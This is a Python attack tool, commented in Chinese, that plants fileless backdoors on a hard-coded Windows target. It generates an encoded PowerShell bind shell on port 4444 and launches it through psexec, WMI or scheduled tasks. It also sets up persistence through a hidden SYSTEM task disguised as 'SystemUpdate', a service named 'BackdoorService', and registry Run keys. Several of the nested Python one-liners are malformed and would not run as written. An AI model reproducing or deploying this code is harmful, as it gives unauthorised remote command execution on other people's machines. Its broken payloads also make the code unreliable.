#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
无文件后门植入工具
无需下载文件，直接在内存中执行后门
"""

import socket
import base64
import subprocess
import threading
import time
import os

class FilelessBackdoor:
    def __init__(self):
        self.target_ip = "10.30.77.103"
        self.common_ports = [135, 139, 445, 3389, 5985, 5986]  # Windows常用端口
    
    def run_fileless_attack_suite(self):
        """运行无文件攻击套件"""
        print("=" * 70)
        print("          无文件后门植入工具")
        print("=" * 70)
        
        print(f"🎯 目标IP: {self.target_ip}")
        print("💡 无文件攻击技术:")
        print("1. PowerShell内存执行")
        print("2. WMI远程命令执行")
        print("3. 计划任务远程执行")
        print("4. 服务控制管理器攻击")
        print("5. 注册表远程修改")
        
        choice = input("\n请选择攻击方法 (1-5): ").strip()
        
        if choice == "1":
            self.powershell_memory_execution()
        elif choice == "2":
            self.wmi_remote_execution()
        elif choice == "3":
            self.scheduled_task_attack()
        elif choice == "4":
            self.service_control_attack()
        elif choice == "5":
            self.registry_remote_attack()
        else:
            print("❌ 无效选择")
    
    def powershell_memory_execution(self):
        """PowerShell内存执行"""
        print("\n[+] PowerShell内存执行攻击")
        print("-" * 40)
        
        # 创建内存后门Payload
        powershell_payload = '''
# 内存后门 - 无文件执行
$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, 4444)
$listener.Start()

while($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    
    while($true) {
        $command = $reader.ReadLine()
        if($command -eq "exit") { break }
        
        try {
            $output = Invoke-Expression $command 2>&1 | Out-String
            $writer.WriteLine($output)
            $writer.Flush()
        } catch {
            $writer.WriteLine("Error: $_")
            $writer.Flush()
        }
    }
    
    $client.Close()
}
'''
        
        # 编码Payload
        encoded_payload = base64.b64encode(powershell_payload.encode('utf-16le')).decode()
        
        print("🔧 生成PowerShell内存后门...")
        print(f"Payload长度: {len(encoded_payload)} 字符")
        
        # 远程执行命令
        command = f"powershell -EncodedCommand {encoded_payload}"
        
        print("\n💡 远程执行方法:")
        print("1. 使用psexec工具")
        print("2. 使用WMI执行")
        print("3. 使用计划任务")
        
        method = input("选择执行方法 (1-3): ").strip()
        
        if method == "1":
            self.execute_via_psexec(command)
        elif method == "2":
            self.execute_via_wmi(command)
        elif method == "3":
            self.execute_via_schtasks(command)
        else:
            print("❌ 无效选择")
    
    def execute_via_psexec(self, command):
        """通过psexec执行"""
        print("\n[+] 尝试使用psexec执行...")
        
        # 检查psexec是否可用
        try:
            result = subprocess.run(['psexec', '\\' + self.target_ip, '-s', command], 
                                  capture_output=True, timeout=10)
            
            if result.returncode == 0:
                print("✅ psexec执行成功")
                print("💡 后门已在目标内存中运行")
                print("   使用 backdoor_client.py 连接端口4444")
            else:
                print("❌ psexec执行失败")
                print(f"错误: {result.stderr.decode()}")
                
        except FileNotFoundError:
            print("❌ psexec工具未找到")
            print("💡 需要下载PsTools套件")
        except Exception as e:
            print(f"❌ 执行失败: {e}")
    
    def execute_via_wmi(self, command):
        """通过WMI执行"""
        print("\n[+] 尝试使用WMI执行...")
        
        wmi_script = f'''
import wmi

c = wmi.WMI(computer="{self.target_ip}")
process_id, result = c.Win32_Process.Create(CommandLine="{command}")
print(f"进程ID: {{process_id}}")
'''
        
        # 保存WMI脚本
        with open('wmi_execute.py', 'w') as f:
            f.write(wmi_script)
        
        print("✅ WMI脚本已生成: wmi_execute.py")
        print("💡 需要安装pywin32: pip install pywin32")
        print("💡 需要目标开启WMI服务")
    
    def execute_via_schtasks(self, command):
        """通过计划任务执行"""
        print("\n[+] 尝试使用计划任务执行...")
        
        # 创建计划任务
        task_command = f'schtasks /create /s {self.target_ip} /tn "SystemUpdate" /tr "{command}" /sc once /st 00:00'
        
        print(f"计划任务命令: {task_command}")
        
        try:
            result = subprocess.run(task_command, shell=True, capture_output=True, timeout=10)
            
            if result.returncode == 0:
                print("✅ 计划任务创建成功")
                
                # 立即运行任务
                run_command = f'schtasks /run /s {self.target_ip} /tn "SystemUpdate"'
                subprocess.run(run_command, shell=True)
                print("✅ 计划任务已执行")
                
            else:
                print("❌ 计划任务创建失败")
                print(f"错误: {result.stderr.decode()}")
                
        except Exception as e:
            print(f"❌ 执行失败: {e}")
    
    def wmi_remote_execution(self):
        """WMI远程命令执行"""
        print("\n[+] WMI远程命令执行攻击")
        print("-" * 40)
        
        wmi_backdoor = '''
$backdoor_code = @"
import socket, subprocess, os
s = socket.socket()
s.bind(('0.0.0.0', 4444))
s.listen(1)
while True:
    c, a = s.accept()
    while True:
        cmd = c.recv(1024).decode()
        if cmd == 'exit': break
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            c.send(result.stdout.encode())
        except: pass
    c.close()
"@

# 保存为Python脚本并执行
$backdoor_code | Out-File "C:\\Windows\\Temp\\bd.py" -Encoding utf8
Start-Process python -ArgumentList "C:\\Windows\\Temp\\bd.py" -WindowStyle Hidden
'''
        
        print("🔧 生成WMI后门脚本...")
        
        # 编码脚本
        encoded_script = base64.b64encode(wmi_backdoor.encode('utf-16le')).decode()
        
        command = f"powershell -EncodedCommand {encoded_script}"
        
        print("💡 使用WMI执行此命令:")
        print(command)
        print("\n⚠️  需要目标开启WMI服务和相应权限")
    
    def scheduled_task_attack(self):
        """计划任务攻击"""
        print("\n[+] 计划任务远程攻击")
        print("-" * 40)
        
        # 创建计划任务XML
        task_xml = '''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>System Update Task</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>python</Command>
      <Arguments>-c "import socket,subprocess,os;s=socket.socket();s.bind(('0.0.0.0',4444));s.listen(1);exec(\"while 1:c,a=s.accept();exec(\"while 1:cmd=c.recv(1024).decode();exec(\"if cmd=='exit':break;exec(\"try:result=subprocess.run(cmd,shell=1,capture_output=1,text=1);c.send(result.stdout.encode());except:pass\")\");c.close()\")\")"</Arguments>
    </Exec>
  </Actions>
</Task>'''
        
        # 保存XML文件
        with open('backdoor_task.xml', 'w', encoding='utf-16') as f:
            f.write(task_xml)
        
        print("✅ 计划任务XML已生成: backdoor_task.xml")
        
        # 创建注册命令
        register_cmd = f'schtasks /create /s {self.target_ip} /xml backdoor_task.xml /tn "SystemUpdate"'
        
        print("\n💡 注册计划任务命令:")
        print(register_cmd)
        print("\n⚠️  需要目标计算机的管理员权限")
    
    def service_control_attack(self):
        """服务控制管理器攻击"""
        print("\n[+] 服务控制管理器攻击")
        print("-" * 40)
        
        # 创建服务安装脚本
        service_script = '''sc \\''' + self.target_ip + ''' create BackdoorService binPath= "python -c \"import socket,subprocess,os;s=socket.socket();s.bind(('0.0.0.0',4444));s.listen(1);exec(\\\"while 1:c,a=s.accept();exec(\\\"while 1:cmd=c.recv(1024).decode();exec(\\\"if cmd=='exit':break;exec(\\\"try:result=subprocess.run(cmd,shell=1,capture_output=1,text=1);c.send(result.stdout.encode());except:pass\\\")\\\");c.close()\\\")\\\")\"" start= auto
sc \\''' + self.target_ip + ''' start BackdoorService
'''
        
        print("🔧 生成服务安装脚本...")
        print("\n💡 服务安装命令:")
        print(service_script)
        print("\n⚠️  需要目标计算机的管理员权限")
        print("💡 服务名: BackdoorService")
        print("💡 端口: 4444")
    
    def registry_remote_attack(self):
        """注册表远程修改攻击"""
        print("\n[+] 注册表远程修改攻击")
        print("-" * 40)
        
        # 注册表启动项 - 简化版本避免转义问题
        reg_commands = [
            f'reg add "\\\\{self.target_ip}\\\\HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "SystemHelper" /t REG_SZ /d "cmd /c python -c \"import socket,subprocess; s=socket.socket(); s.bind((\'0.0.0.0\',4444)); s.listen(5); exec(\\\"while True: c,a=s.accept(); exec(\\\"while True: cmd=c.recv(1024).decode(); if cmd==\'exit\': break; try: r=subprocess.run(cmd,shell=True,capture_output=True,text=True); c.send(r.stdout.encode() if r.stdout else r.stderr.encode()); except: pass\\\")\\\")\"" /f',
            f'reg add "\\\\{self.target_ip}\\\\HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce" /v "SystemUpdate" /t REG_SZ /d "cmd /c python -c \"import socket,subprocess; s=socket.socket(); s.bind((\'0.0.0.0\',4444)); s.listen(5); exec(\\\"while True: c,a=s.accept(); exec(\\\"while True: cmd=c.recv(1024).decode(); if cmd==\'exit\': break; try: r=subprocess.run(cmd,shell=True,capture_output=True,text=True); c.send(r.stdout.encode() if r.stdout else r.stderr.encode()); except: pass\\\")\\\")\"" /f'
        ]
        
        print("🔧 生成注册表修改命令...")
        
        for i, cmd in enumerate(reg_commands, 1):
            print(f"\n命令 {i}:")
            print(cmd)
        
        print("\n⚠️  需要目标计算机的管理员权限")
        print("💡 修改后需要重启目标计算机生效")

def main():
    """主函数"""
    try:
        backdoor = FilelessBackdoor()
        backdoor.run_fileless_attack_suite()
        
    except KeyboardInterrupt:
        print("\n👋 程序被用户中断")
    except Exception as e:
        print(f"❌ 程序错误: {e}")

if __name__ == "__main__":
    main()